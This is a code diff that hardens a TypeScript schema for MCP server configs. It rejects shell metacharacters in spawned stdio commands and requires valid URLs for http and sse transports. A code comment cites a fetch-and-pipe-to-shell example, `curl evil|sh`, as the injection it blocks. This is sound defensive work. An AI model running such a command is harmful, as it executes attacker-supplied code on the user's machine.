@@ -189,22 +189,49 @@ export type ConfigFile = z.infer<typeof ConfigFileSchema>;
  * `z.unknown()`); values may carry secrets (tokens) — they are persisted in
  * plaintext in the Nightcore store, same trust model as the user's own
  * `~/.claude.json`, and never logged at info/telemetry.
+ *
+ * VALIDATION (security). A stdio server's `command` is SPAWNED as a subprocess the
+ * moment the SDK connects — a code path the runtime confinement gates never see
+ * (it is a sibling process, not an agent tool call). So the `command` is required
+ * to be a plain executable name/path: no shell metacharacters (`;`, `|`, `&`, `$`,
+ * backtick, redirects, subshells, globs, quotes, newlines), which blocks a
+ * `command: "sh -c 'curl evil|sh'"`-style entry from a poisoned config store. A
+ * bare `sh`/`bash` is still a valid program (the danger there lives in `args`,
+ * which the UI surfaces for review) — this is schema-level hardening for the
+ * opt-in surface, not a full sandbox. `url` is validated as a real URL (`.url()`)
+ * so an http/sse transport can't carry a `file://`-less garbage or injection
+ * string. Both keep `def.type === 'string'` so the Rust codegen still emits
+ * `String` (no wire/contract change).
  */
+
+/** Shell metacharacters that must never appear in a spawned stdio `command` — any
+ *  of these turns a plain exec into a shell-injection surface. `\` is allowed
+ *  (Windows drive paths) and spaces are allowed (paths with spaces); the command
+ *  is exec'd as argv[0], not through a shell, so only the injection-enabling
+ *  characters are rejected. */
+const SHELL_METACHARACTERS = /[;&|<>$`()*?"'{}\n\r\t]/;
+
 export const McpServerTransportSchema = z.discriminatedUnion('transport', [
   z.object({
     transport: z.literal('stdio'),
-    command: z.string(),
+    command: z
+      .string()
+      .min(1, 'MCP stdio command must not be empty')
+      .refine(
+        (c) => !SHELL_METACHARACTERS.test(c),
+        'MCP stdio command must be a plain executable name/path without shell metacharacters',
+      ),
     args: z.array(z.string()).default([]),
     env: z.record(z.string(), z.string()).default({}),
   }),
   z.object({
     transport: z.literal('http'),
-    url: z.string(),
+    url: z.url('MCP http server url must be a valid URL'),
     headers: z.record(z.string(), z.string()).default({}),
   }),
   z.object({
     transport: z.literal('sse'),
-    url: z.string(),
+    url: z.url('MCP sse server url must be a valid URL'),
     headers: z.record(z.string(), z.string()).default({}),
   }),
 ]);
